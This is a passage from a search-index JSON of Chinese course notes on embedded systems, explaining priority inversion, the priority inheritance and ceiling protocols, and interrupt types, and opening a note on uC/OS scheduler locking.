\u5728\u7cfb\u7edf\u4e2d\uff0c\u6709\u4e9b\u8d44\u6e90\u5fc5\u987b\u662f\u72ec\u5360\u4f7f\u7528\u7684\uff0c\u591a\u4e2a\u4efb\u52a1\u5bf9\u8fd9\u6837\u7684\u8d44\u6e90\u7684\u5e76\u53d1\u8bbf\u95ee\u5c06\u5bfc\u81f4\u9519\u8bef\u7684\u53d1\u751f\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5bf9\u9700\u8981\u72ec\u5360\u4f7f\u7528\u7684\u8d44\u6e90\u5fc5\u987b\u4f7f\u7528\u4e92\u65a5\u65b9\u6cd5\u5c06\u5bf9\u5176\u7684\u5e76\u53d1\u8bbf\u95ee\u4e32\u884c\u5316 1 \u3002 \u5728\u4f18\u5148\u7ea7\u591a\u4efb\u52a1\u7cfb\u7edf\u4e2d\u5f15\u5165\u4e92\u65a5\u65b9\u6848\uff0c\u4f1a\u5bfc\u81f4\u4efb\u52a1\u4f18\u5148\u7ea7\u53cd\u8f6c\u7684\u95ee\u9898\uff1a\u5047\u5982\u67d0\u65f6\u4f4e\u4f18\u5148\u7ea7\u7684\u4efb\u52a1\u5360\u6709\u8d44\u6e90\uff0c\u7136\u540e\u53c8\u6709\u9ad8\u4f18\u5148\u7ea7\u7684\u4efb\u52a1\u7533\u8bf7\u8d44\u6e90\uff0c\u4f46\u56e0\u4e3a\u4e0d\u80fd\u6ee1\u8db3\u800c\u88ab\u6302\u8d77\u4e86\uff0c\u5373 \u4f4e\u4f18\u5148\u7ea7\u4efb\u52a1\u963b\u585e\u4e86\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1\u7684\u8fd0\u884c \u3002\u5047\u5982\u8fd9\u65f6\u53c8\u6709\u4e00\u4e2a\u4e2d\u4f18\u5148\u7ea7\u4efb\u52a1\uff0c\u90a3\u4e48\u5b83\u4f1a\u628a\u4f4e\u4f18\u5148\u7ea7\u4efb\u52a1\u62a2\u5360\u3002\u6700\u7ec8\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1\u4f1a\u95f4\u63a5\u5730\u88ab\u4e2d\u4f18\u5148\u7ea7\u4efb\u52a1\u62a2\u5360\u4e86\u3002\u8fd9\u79cd\u73b0\u8c61\u53eb\u4f5c \u4f18\u5148\u7ea7\u53cd\u8f6c \u3002\u4e3e\u4f8b\u8bf4\u660e\uff1a \u5047\u5982A\u3001D\u3001C\u4e09\u4e2a\u4efb\u52a1\u4f18\u5148\u7ea7\u4ece\u9ad8\u5230\u4f4e\u6392\u5217\uff0c\u4efb\u52a1A\u548cC\u5171\u4eab\u4e92\u65a5\u4fe1\u53f7\u91cfR\uff0c\u5982\u679c\u67d0\u4e00\u65f6\u523b\u4efb\u52a1C\u5df2\u7ecf\u83b7\u5f97\u4e92\u65a5\u4fe1\u53f7\u91cfR\uff0c\u800c\u4efb\u52a1A\u6b64\u65f6\u5c1d\u8bd5\u5360\u7528R\uff0c\u90a3\u4e48\u4efb\u52a1A\u4f1a\u56e0\u4e3a\u5f97\u4e0d\u5230R\u800c\u963b\u585e\u5728R\u7684 \u4efb\u52a1\u7b49\u5f85\u961f\u5217 \u4e2d\u3002\u518d\u5047\u8bbe\u6b64\u65f6\u4efb\u52a1D\u56e0\u4e3a\u4f18\u5148\u7ea7\u9ad8\u4e8e\u4efb\u52a1C\u4ece\u800c\u62a2\u5360\u4e86C\uff0c\u8fdb\u800c\u957f\u671f\u5360\u6709\u5904\u7406\u5668\u8d44\u6e90\uff0c\u90a3\u4e48\u5c31\u76f8\u5f53\u4e8e\u4e2d\u4f18\u5148\u7ea7\u7684\u4efb\u52a1D\u95f4\u63a5\u963b\u585e\u4e86\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1A\u7684\u8fd0\u884c\u3002 \\text{Figure 1. \u4f18\u5148\u7ea7\u53cd\u8f6c} T0\u65f6\u523b\uff0c\u4efb\u52a1C\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\uff0c\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4efb\u52a1C\u83b7\u5f97\u4e86\u5171\u4eab\u8d44\u6e90R\u3002 T1\u65f6\u523b\uff0c\u4efb\u52a1A\u5c31\u7eea\u3002\u7531\u4e8e\u4efb\u52a1A\u4f18\u5148\u7ea7\u9ad8\u4e8e\u4efb\u52a1C\uff0c\u6240\u4ee5\u5b83\u62a2\u5360\u4e86\u4efb\u52a1C\uff0c\u4efb\u52a1A\u88ab\u8c03\u5ea6\u6267\u884c\u3002 T2\u65f6\u523b\uff0c\u4efb\u52a1A\u9700\u8981\u5171\u4eab\u8d44\u6e90R\uff0c\u4f46R\u88ab\u66f4\u4f4e\u4f18\u5148\u7ea7\u7684\u4efb\u52a1C\u6240\u62e5\u6709\uff0c\u6240\u4ee5\u4efb\u52a1A\u88ab\u963b\u585e\u7b49\u5f85\u8be5\u8d44\u6e90\u3002\u4efb\u52a1C\u5f97\u5230\u6267\u884c\u3002 T3\u65f6\u523b\uff0c\u6b64\u65f6\u4efb\u52a1D\u5c31\u7eea\uff0c\u7531\u4e8e\u4efb\u52a1D\u4f18\u5148\u7ea7\u9ad8\u4e8e\u4efb\u52a1C\uff0c\u6240\u4ee5\u5b83\u62a2\u5360\u4e86\u4efb\u52a1C\uff0c\u4efb\u52a1D\u88ab\u8c03\u5ea6\u6267\u884c\u3002 \u4ece\u6574\u4e2a\u6d41\u7a0b\u4e0a\u770b\uff0cT3\u65f6\u523b\uff0c\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1A\u88ab\u4f4e\u4f18\u5148\u7ea7\u4efb\u52a1D\u95f4\u63a5\u5730\u62a2\u5360\u4e86\u3002\u6b64\u65f6\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u4efb\u52a1A\u4e0d\u4ec5\u8981\u7b49\u4efb\u52a1C\u8fd0\u884c\u5b8c\uff0c\u8fd8\u8981\u7b49\u4f18\u5148\u7ea7\u4f4e\u7684\u4efb\u52a1D\u8fd0\u884c\u5b8c\u624d\u80fd\u88ab\u8c03\u5ea6\uff0c\u5982\u679c\u4efb\u52a1D\u548c\u4efb\u52a1C\u9700\u8981\u6267\u884c\u5f88\u957f\u65f6\u95f4\uff0c\u90a3\u4e48\u4efb\u52a1A\u7684\u6267\u884c\u5c31\u4e0d\u80fd\u5f97\u5230\u4fdd\u8bc1\uff0c\u6574\u4e2a\u7cfb\u7edf\u7684\u5b9e\u65f6\u6027\u80fd\u5f88\u5dee\u3002 \u4f18\u5148\u7ea7\u53cd\u8f6c\u73b0\u8c61\u5bf9\u57fa\u4e8e\u4f18\u5148\u7ea7\u8c03\u5ea6\u7684\u5b9e\u65f6\u7cfb\u7edf\u6709\u5f88\u5927\u7684\u5f71\u54cd\u3002\u5728\u57fa\u4e8e\u4f18\u5148\u7ea7\u8c03\u5ea6\u7684\u7cfb\u7edf\u4e2d\uff0c\u5904\u7406\u5668\u8d44\u6e90\u662f\u6309\u7167\u4f18\u5148\u7ea7\u5206\u914d\u7ed9\u4efb\u52a1\u7684\uff0c\u5c31\u7eea\u7684\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1\u5fc5\u987b\u5b9e\u65f6\u83b7\u5f97\u5904\u7406\u5668\u3002\u7cfb\u7edf\u4e2d\u7684\u5404\u79cd\u8d44\u6e90\uff0c\u5982\u679c\u91c7\u7528\u6309\u7167\u4efb\u52a1\u4f18\u5148\u7ea7\u5206\u914d\u7684\u539f\u5219\uff0c\u90a3\u4e48\u9ad8\u4f18\u5148\u7ea7\u7684\u4efb\u52a1\u5e94\u8be5\u662f\u9996\u5148\u88ab\u8003\u8651\u7684\u3002\u4f18\u5148\u7ea7\u53cd\u8f6c\u7684\u95ee\u9898\u5c06\u6253\u4e71\u8fd9\u4e9b\u539f\u5219\u3002","title":"2.1. \u4f18\u5148\u7ea7\u53cd\u8f6c"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/2.%E4%BC%98%E5%85%88%E7%BA%A7%E5%8F%8D%E8%BD%AC%E4%B8%8E%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6/#22","text":"\u4f18\u5148\u7ea7\u53cd\u8f6c\u95ee\u9898\u7684\u6838\u5fc3\u539f\u56e0\u5728\u4e8e\u5171\u4eab\u8d44\u6e90\u7684\u8bbf\u95ee\u89c4\u5219\uff0c\u5373\u5171\u4eab\u8d44\u6e90\u53ea\u80fd\u88ab\u4e00\u4e2a\u4efb\u52a1\u5360\u7528\uff0c\u88ab\u5360\u7528\u540e\u5176\u4ed6\u4efb\u52a1\u4e0d\u80fd\u5f3a\u5236\u4f7f\u7528\u8fd9\u4e2a\u8d44\u6e90\u3002\u5728\u4f18\u5148\u7ea7\u53cd\u8f6c\u95ee\u9898\u4e0a\uff0c\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1\u88ab\u4f4e\u4f18\u5148\u7ea7\u4efb\u52a1\u963b\u585e\u662f\u5fc5\u5b9a\u7684\uff0c\u4f46\u88ab\u4e2d\u4f18\u5148\u7ea7\u4efb\u52a1\u963b\u585e\u5219\u662f\u5f88\u65e0\u5948\u7684\u3002\u4e3a\u4e86\u907f\u514d\u56e0\u4e3a\u4e2d\u4f18\u5148\u7ea7\u4efb\u52a1\u631f\u6301\u4f4e\u4f18\u5148\u7ea7\u4efb\u52a1\u4ece\u800c\u963b\u585e\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1\u7684\u73b0\u8c61\uff0c\u53ef\u4ee5\u91c7\u7528\u4e00\u4e9b\u5fc5\u8981\u7684\u7b97\u6cd5\u3002 \u6709\u4e24\u79cd\u7ecf\u5178\u7684\u9632\u6b62\u4f18\u5148\u7ea7\u53cd\u8f6c\u7684\u7b97\u6cd5\uff1a \u4f18\u5148\u7ea7\u7ee7\u627f\u7b56\u7565\uff08Priority inheritance\uff09\uff1a\u5f53\u4e00\u4e2a\u4efb\u52a1\u5360\u6709\u4e86\u8d44\u6e90\u5e76\u4e14\u968f\u540e\u963b\u585e\u4e86\u5176\u4ed6\u7533\u8bf7\u8be5\u8d44\u6e90\u7684\u4efb\u52a1\u65f6\uff0c\u8be5\u4efb\u52a1\u5c06\u4e34\u65f6\u6539\u53d8\u5b83\u7684\u4f18\u5148\u7ea7\u4e3a\u6240\u6709\u7533\u8bf7\u8be5\u8d44\u6e90\u7684\u4efb\u52a1\u4e2d\u7684\u6700\u9ad8\u4f18\u5148\u7ea7\uff0c\u5e76\u4ee5\u8fd9\u4e2a\u4e34\u65f6\u4f18\u5148\u7ea7\u5728\u4e34\u754c\u533a\u6267\u884c\u3002\u5f53\u4efb\u52a1\u91ca\u653e\u8d44\u6e90\u540e\uff0c\u5219\u6062\u590d\u5b83\u539f\u6709\u7684\u4f18\u5148\u7ea7\u3002\u4ece\u884c\u4e3a\u4e0a\u770b\uff0c\u5360\u6709\u8d44\u6e90\u7684\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u5c06\u662f\u201c\u6c34\u6da8\u8239\u9ad8\u201d\u5f0f\u7684\u591a\u6b21\u6539\u53d8\uff0c\u56e0\u4e3a\u5b83\u7684\u4f18\u5148\u7ea7\u6700\u9ad8\uff0c\u6240\u4ee5\u5b83\u4e0d\u4f1a\u88ab\u66fe\u7ecf\u6bd4\u5b83\u4f18\u5148\u7ea7\u9ad8\u7684\u90a3\u4e9b\u4efb\u52a1\u62a2\u5360\u3002\u64cd\u4f5c\u7cfb\u7edf\u4ece\u4f18\u5148\u7ea7\u89d2\u5ea6\u5b89\u6392\u5b83\u5c3d\u5feb\u6267\u884c\uff0c\u5c3d\u5feb\u91ca\u653e\u8d44\u6e90\uff0c\u4f46\u662f\u8fd9\u6837\u505a\u64cd\u4f5c\u7cfb\u7edf\u5374\u727a\u7272\u4e86\u4e2d\u7b49\u4f18\u5148\u7ea7\u4efb\u52a1\u7684\u8c03\u5ea6\u673a\u4f1a\u3002 \u4f18\u5148\u7ea7\u5929\u82b1\u677f\u7b56\u7565\uff08Priority ceilings\uff09\uff1a\u5c06\u7533\u8bf7\uff08\u5360\u6709\uff09\u8d44\u6e90\u7684\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u63d0\u5347\u5230\u53ef\u80fd\u8bbf\u95ee\u8be5\u8d44\u6e90\u7684\u6240\u6709\u4efb\u52a1\u7684\u6700\u9ad8\u4f18\u5148\u7ea7\uff08\u8fd9\u4e2a\u6700\u9ad8\u4f18\u5148\u7ea7\u79f0\u4e3a\u8be5\u8d44\u6e90\u7684\u4f18\u5148\u7ea7\u5929\u82b1\u677f\uff09\u3002","title":"2.2. \u4f18\u5148\u7ea7\u7ee7\u627f\u548c\u4f18\u5148\u7ea7\u5929\u82b1\u677f\u7b56\u7565"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/2.%E4%BC%98%E5%85%88%E7%BA%A7%E5%8F%8D%E8%BD%AC%E4%B8%8E%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6/#221","text":"\\text{Figure 2. \u4f18\u5148\u7ea7\u7ee7\u627f\u7b56\u7565} \u521d\u59cb\u4f18\u5148\u7ea7\uff1a A > D > B > C \uff08\u4ece\u9ad8\u5230\u4f4e\u6392\u5e8f\uff09 T0\u65f6\u523b\uff0c\u53ea\u6709\u4efb\u52a1C\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\uff0c\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4efb\u52a1C\u5f97\u5230\u5171\u4eab\u8d44\u6e90R\u3002 T1\u65f6\u523b\uff0c\u4efb\u52a1B\u62a2\u5360\u4efb\u52a1C\uff0c\u5e76\u5c1d\u8bd5\u83b7\u5f97\u8d44\u6e90R\uff0c\u56e0\u4e3a\u4f18\u5148\u7ea7\u7ee7\u627f\u7684\u539f\u56e0\uff0c\u4efb\u52a1C\u7684\u4f18\u5148\u7ea7\u88ab\u63d0\u5347\u5230\u4efb\u52a1B\u7684\u4f18\u5148\u7ea7\uff1b\u4efb\u52a1B\u88ab\u963b\u585e\u3002 T2\u65f6\u523b\uff0c\u4efb\u52a1A\u62a2\u5360\u4efb\u52a1C\uff0c\u5e76\u5c1d\u8bd5\u83b7\u5f97\u8d44\u6e90R\uff0c\u56e0\u4e3a\u4f18\u5148\u7ea7\u7ee7\u627f\u7684\u539f\u56e0\uff0c\u4efb\u52a1C\u7684\u4f18\u5148\u7ea7\u88ab\u63d0\u5347\u5230\u4efb\u52a1A\u7684\u4f18\u5148\u7ea7\uff1b\u4efb\u52a1A\u88ab\u963b\u585e\u3002 \u5728Ta\u65f6\u523b\uff0c\u4efb\u52a1D\u5c31\u7eea\uff0c\u4f46\u56e0\u4e3a\u6b64\u65f6\u4efb\u52a1C\u7684\u4f18\u5148\u7ea7\u5df2\u7ecf\u88ab\u63d0\u5347\u5e76\u4e14\u6bd4\u4efb\u52a1D\u4f18\u5148\u7ea7\u9ad8\uff0c\u6240\u4ee5\u4efb\u52a1D\u4e0d\u80fd\u62a2\u5360\u4efb\u52a1C\uff0c\u4efb\u52a1C\u7ee7\u7eed\u8fd0\u884c\u3002 T3\u65f6\u523b\uff0c\u4efb\u52a1C\u91ca\u653e\u8d44\u6e90\uff0c\u5b83\u7684\u4f18\u5148\u7ea7\u6062\u590d\u5230\u539f\u6709\u4f18\u5148\u7ea7\u3002\u4efb\u52a1A\u5f97\u5230\u8d44\u6e90\uff0c\u5e76\u56e0\u4e3a\u4f18\u5148\u7ea7\u539f\u56e0\u62a2\u5360\u4efb\u52a1C\u3002 T4\u65f6\u523b\uff0c\u4efb\u52a1A\u91ca\u653e\u8d44\u6e90\uff0c\u7ed3\u675f\u8fd0\u884c\u3002\u4efb\u52a1B\u5f97\u5230\u8d44\u6e90\u3002\u4f46\u6b64\u65f6\u56e0\u4e3a\u4efb\u52a1D\u4f18\u5148\u7ea7\u9ad8\u4e8e\u4efb\u52a1B\uff0c\u6240\u4ee5\u4efb\u52a1D\u5f00\u59cb\u8fd0\u884c\u3002 T5\u65f6\u523b\uff0c\u4efb\u52a1D\u7ed3\u675f\u8fd0\u884c\uff0c\u4efb\u52a1B\u5f00\u59cb\u6267\u884c\u3002","title":"2.2.1. \u4f18\u5148\u7ea7\u7ee7\u627f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/2.%E4%BC%98%E5%85%88%E7%BA%A7%E5%8F%8D%E8%BD%AC%E4%B8%8E%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6/#222","text":"\\text{Figure 3. \u4f18\u5148\u7ea7\u5929\u82b1\u677f\u7b56\u7565} T0\u65f6\u523b\uff0c\u53ea\u6709\u4efb\u52a1C\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u3002 T1\u65f6\u523b\uff0c\u4efb\u52a1C\u5f97\u5230\u5171\u4eab\u8d44\u6e90R\uff0c\u56e0\u4e3a\u4f18\u5148\u7ea7\u5929\u82b1\u677f\u7b56\u7565\u7684\u539f\u56e0\uff0c\u4efb\u52a1C\u7684\u4f18\u5148\u7ea7\u63d0\u5347\u5230\u5168\u90e8\u53ef\u80fd\u8bbf\u95ee\u8be5\u8d44\u6e90\u7684\u4efb\u52a1\u7684\u6700\u9ad8\u4f18\u5148\u7ea7\u3002 Ta\u65f6\u523b\uff0c\u4efb\u52a1A\u62a2\u5360\u4efb\u52a1C\u6267\u884c\uff0c\u968f\u540e\u5c1d\u8bd5\u83b7\u5f97\u8d44\u6e90R\uff0c\u4f46\u662f\u5931\u8d25\u5e76\u963b\u585e\u3002\u4efb\u52a1C\u7ee7\u7eed\u8fd0\u884c\u3002 Tb\u65f6\u523b\uff0c\u4efb\u52a1B\u5c31\u7eea\uff0c\u4f46\u662f\u56e0\u4e3a\u4efb\u52a1C\u4f18\u5148\u7ea7\u66f4\u9ad8\uff0c\u6240\u4ee5\u53ea\u80fd\u7b49\u5f85\u6267\u884c\u3002 T2\u65f6\u523b\u4efb\u52a1C\u91ca\u653e\u8d44\u6e90R\uff0c\u4efb\u52a1A\u5f97\u5230\u8d44\u6e90R\u3002\u56e0\u4e3a\u4f7f\u7528\u4f18\u5148\u7ea7\u5929\u82b1\u677f\u7b56\u7565\uff0c\u4efb\u52a1C\u4f18\u5148\u7ea7\u6062\u590d\u5230\u539f\u6709\u4f18\u5148\u7ea7\u3002\u4efb\u52a1A\u62a2\u5360\u4efb\u52a1C\u5f00\u59cb\u8fd0\u884c\u3002 T3\u65f6\u523b\uff0c\u4efb\u52a1A\u7ed3\u675f\u8fd0\u884c\u3002\u4efb\u52a1B\u5f00\u59cb\u8fd0\u884c\u3002 T4\u65f6\u523b\uff0c\u4efb\u52a1B\u7ed3\u675f\u8fd0\u884c\u3002\u4efb\u52a1C\u5f00\u59cb\u7ee7\u7eed\u8fd0\u884c\u3002 \u4f18\u5148\u7ea7\u7ee7\u627f\u7b56\u7565\u5bf9\u4efb\u52a1\u6267\u884c\u6d41\u7a0b\u7684\u5f71\u54cd\u76f8\u5bf9\u8f83\u5c0f\uff0c\u56e0\u4e3a\u53ea\u6709\u5f53\u9ad8\u4f18\u5148\u7ea7\u4efb\u52a1\u7533\u8bf7\u5df2\u88ab\u4f4e\u4f18\u5148\u7ea7\u4efb\u52a1\u5360\u6709\u7684\u5171\u4eab\u8d44\u6e90\u8fd9\u4e00\u4e8b\u5b9e\u53d1\u751f\u65f6\uff0c\u624d\u63d0\u5347\u4f4e\u4f18\u5148\u7ea7\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u3002\u800c\u5929\u82b1\u677f\u7b56\u7565\u662f\u8c01\u5360\u6709\u5c31\u76f4\u63a5\u5347\u5230\u6700\u9ad8\u3002\u5f62\u8c61\u5730\u8bf4\uff0c\u4f18\u5148\u7ea7\u7ee7\u627f\u7b56\u7565\u662f\u201c\u6c34\u6da8\u8239\u9ad8\u201d\uff0c\u800c\u4f18\u5148\u7ea7\u5929\u82b1\u677f\u7b56\u7565\u5219\u662f\u201c\u4e00\u6b21\u5230\u4f4d\u201d\u3002","title":"2.2.2. \u4f18\u5148\u7ea7\u5929\u82b1\u677f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/2.%E4%BC%98%E5%85%88%E7%BA%A7%E5%8F%8D%E8%BD%AC%E4%B8%8E%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6/#3","text":"\u4e2d\u65ad\u673a\u5236\u662f\u5904\u7406\u5668\u7684\u91cd\u8981\u57fa\u7840\u8bbe\u65bd\uff0c\u7528\u6765\u5e94\u5bf9\u5404\u79cd\u4e8b\u4ef6\u7684\u54cd\u5e94\u548c\u5904\u7406\u3002\u5f53\u5916\u8bbe\u6216\u8005\u5904\u7406\u5668\u81ea\u8eab\u6709\u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u5904\u7406\u5668\u4f1a\u6682\u505c\u6267\u884c\u5f53\u524d\u7684\u4ee3\u7801\uff0c\u5e76\u8f6c\u5411\u5904\u7406\u8fd9\u4e9b\u4e2d\u65ad\u4e8b\u52a1\u3002\u5728\u5904\u7406\u5668\u4e0e\u5916\u8bbe\u95f4\u7684\u4ea4\u4e92\u5927\u591a\u91c7\u7528\u4e2d\u65ad\u6765\u5b8c\u6210\uff0c\u4e2d\u65ad\u7cfb\u7edf\u80fd\u6781\u5927\u63d0\u9ad8\u7cfb\u7edf\u7684\u6548\u7387\u3002 \u53d1\u51fa\u4e2d\u65ad\u8bf7\u6c42\u7684\u6765\u6e90\u53eb\u4f5c\u4e2d\u65ad\u6e90\u3002\u6839\u636e\u4e2d\u65ad\u6e90\u7684\u4e0d\u540c\uff0c\u53ef\u4ee5\u628a\u4e2d\u65ad\u5206\u4e3a\u4ee5\u4e0b\u4e09\u7c7b\uff1a","title":"3. \u4e2d\u65ad\u673a\u5236"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/2.%E4%BC%98%E5%85%88%E7%BA%A7%E5%8F%8D%E8%BD%AC%E4%B8%8E%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6/#31","text":"\u5916\u90e8\u4e2d\u65ad\u662f\u6307\u7531\u7cfb\u7edf\u5916\u8bbe\u53d1\u51fa\u7684\u4e2d\u65ad\u8bf7\u6c42\uff0c\u5982\u4e32\u53e3\u6570\u636e\u7684\u63a5\u6536\u3001\u952e\u76d8\u7684\u6572\u51fb\u3001\u6253\u5370\u673a\u4e2d\u65ad\u3001\u5b9a\u65f6\u5668\u65f6\u95f4\u5230\u8fbe\u7b49\u3002\u5916\u90e8\u4e2d\u65ad\u5927\u591a\u662f\u53ef\u4ee5\u5c4f\u853d\u7684\uff0c\u7a0b\u5e8f\u53ef\u4ee5\u6839\u636e\u5177\u4f53\u9700\u8981\uff0c\u901a\u8fc7\u4e2d\u65ad\u63a7\u5236\u5668\u6765\u5c4f\u853d\u8fd9\u4e9b\u4e2d\u65ad\u8bf7\u6c42\u3002","title":"3.1. \u5916\u90e8\u4e2d\u65ad"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/2.%E4%BC%98%E5%85%88%E7%BA%A7%E5%8F%8D%E8%BD%AC%E4%B8%8E%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6/#32","text":"\u5185\u90e8\u4e2d\u65ad\u6307\u56e0\u5904\u7406\u5668\u81ea\u8eab\u7684\u539f\u56e0\u5f15\u8d77\u7684\u5f02\u5e38\u4e8b\u4ef6\uff0c\u5982\u975e\u6cd5\u6307\u4ee4\u3001\u603b\u7ebf\u9519\u8bef\uff08\u53d6\u6307\uff09\u6216\u8005\u8fd0\u7b97\u51fa\u9519\uff08\u96640\uff09\u7b49\u3002\u5185\u90e8\u4e2d\u65ad\u57fa\u672c\u662f\u4e0d\u53ef\u5c4f\u853d\u7684\u4e2d\u65ad\u3002","title":"3.2. \u5185\u90e8\u4e2d\u65ad"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/2.%E4%BC%98%E5%85%88%E7%BA%A7%E5%8F%8D%E8%BD%AC%E4%B8%8E%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6/#33","text":"\u8f6f\u4ef6\u4e2d\u65ad\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u4e2d\u65ad\uff0c\u5b83\u662f\u7a0b\u5e8f\u901a\u8fc7\u8f6f\u4ef6\u6307\u4ee4\u89e6\u53d1\u7684\uff0c\u4ece\u800c\u4e3b\u52a8\u5f15\u8d77\u7a0b\u5e8f\u6d41\u7a0b\u7684\u53d8\u5316\u3002\u6bd4\u5982\u5728\u7528\u6237\u7ea7\u8fd0\u884c\u7684\u7a0b\u5e8f\u5728\u67d0\u65f6\u523b\u9700\u8981\u8bbf\u95ee\u5904\u7406\u5668\u4e2d\u53d7\u5230\u4fdd\u62a4\u7684\u5bc4\u5b58\u5668\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7\u8f6f\u4ef6\u4e2d\u65ad\u8fdb\u5165\u7cfb\u7edf\u7ea7\uff0c\u5b9e\u73b0\u6743\u9650\u7684\u63d0\u5347 1 \u3002 \u6ce8\uff1a\u7248\u6743\u5f52\u539f\u4f5c\u8005\u5218\u65ed\u660e\u8001\u5e08\u6240\u6709","title":"3.3. \u8f6f\u4ef6\u4e2d\u65ad"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/2.%E4%BC%98%E5%85%88%E7%BA%A7%E5%8F%8D%E8%BD%AC%E4%B8%8E%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6/#4","text":"\u5218\u65ed\u660e. \u5d4c\u5165\u5f0f\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\u539f\u7406\u4e0e\u6700\u4f73\u5b9e\u8df5. \u673a\u68b0\u5de5\u4e1a\u51fa\u7248\u793e, 2014. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4. \u53c2\u8003\u6587\u732e"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/3.uCos%E4%B8%AD%E9%94%81%E8%B0%83%E5%BA%A6%E5%99%A8%E4%B8%BA%E4%BB%80%E4%B9%88%E6%AF%94%E5%85%B3%E4%B8%AD%E6%96%AD%E6%95%88%E7%8E%87%E6%9B%B4%E9%AB%98/","text":"uC/OS\u4e2d\u9501\u8c03\u5ea6\u5668\u4e3a\u4ec0\u4e48\u6bd4\u5173\u4e2d\u65ad\u6548\u7387\u66f4\u9ad8 # \u76ee\u5f55 # uC/OS\u4e2d\u9501\u8c03\u5ea6\u5668\u4e3a\u4ec0\u4e48\u6bd4\u5173\u4e2d\u65ad\u6548\u7387\u66f4\u9ad8 \u76ee\u5f55 1. \u80cc\u666f 2. \u4f18\u5316\u539f\u56e0 3. \u5173\u4e2d\u65ad\u548c\u9501\u8c03\u5ea6\u5668 3.1. \u6982\u5ff5 3.2. \u6e90\u4ee3\u7801 3.2.1. \u5f00/\u5173\u4e2d\u65ad 3.2.2. \u9501\u8c03\u5ea6\u5668 4. \u53c2\u8003\u6587\u732e 1. \u80cc\u666f # \u4eca\u5929\u770b \u300a\u03bcC/OS-III\u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u7684\u65f6\u5019\u5b66\u4e60\u4e86\u901a\u8fc7\u4f7f\u7528 \u9501\u8c03\u5ea6\u5668 \u4ee3\u66ff \u5173\u4e2d\u65ad \uff0c\u5e76\u4f7f\u7528\u4e2d\u65ad\u5ef6\u8fdf\u63d0\u4ea4\uff0c\u80fd\u591f\u5927\u5927\u8282\u7701\u5173\u4e2d\u65ad\u7684\u65f6\u95f4\uff0c\u63d0\u9ad8\u8fd0\u884c\u6548\u7387\u3002\u4f46\u662f\u6548\u7387\u5177\u4f53\u662f\u5982\u4f55\u63d0\u9ad8\u7684\uff0c\u4e66\u4e2d\u7684\u8bf4\u660e\u6211\u6ca1\u6709\u592a\u770b\u660e\u767d\uff0c\u4e8e\u662f\u6211\u5c31\u628a\u4e66\u4e2d\u63d0\u5230\u7684\u51fd\u6570\u7684\u6e90\u4ee3\u7801\u627e\u51fa\u6765\u5206\u6790\u4e86\u4e00\u4e0b\uff0c\u5e0c\u671b\u80fd\u591f\u7406\u89e3 \u9501\u8c03\u5ea6\u5668 \u548c \u5173\u4e2d\u65ad \u4e24\u8005\u4e4b\u95f4\u7684\u533a\u522b\u3002uC/OS\u5b8c\u6574\u6e90\u4ee3\u7801\u53ef\u4ee5\u4ece \u5b98\u7f51 \u548c \u6211\u7684Github\u4e0a \u4e0b\u8f7d\u3002 2. \u4f18\u5316\u539f\u56e0 # 